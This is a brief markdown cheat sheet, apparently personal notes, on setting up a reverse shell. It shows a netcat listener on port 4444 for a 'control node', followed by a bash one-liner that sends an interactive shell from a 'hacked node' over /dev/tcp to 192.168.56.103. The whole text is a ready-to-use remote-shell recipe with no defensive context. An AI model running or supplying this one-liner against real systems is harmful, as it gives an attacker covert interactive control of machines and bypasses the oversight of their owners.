# Reverse - Shell 

## Control-Node main.example.com

```
# here we will issue the commands
nc -l 4444
```

## Hacked node secondary.example.com

```
bash -i >& /dev/tcp/192.168.56.103/4444 0>&1
```
